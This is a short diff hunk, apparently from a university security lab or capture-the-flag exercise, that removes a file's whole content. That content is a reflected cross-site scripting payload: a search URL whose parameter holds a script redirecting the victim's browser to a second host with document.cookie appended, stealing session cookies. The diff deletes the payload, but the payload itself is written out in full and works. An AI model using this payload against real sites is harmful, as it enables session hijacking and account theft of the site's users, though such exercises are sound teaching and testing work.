@@ -1,6 +1,0 @@
-
-http://mustard.stt.rnl.tecnico.ulisboa.pt:23251/?search=<script>
-  window.location.href = 'http://nexus.rnl.tecnico.ulisboa.pt:30000/?cookie='.concat(encodeURIComponent(document.cookie));
-</script>
-
-
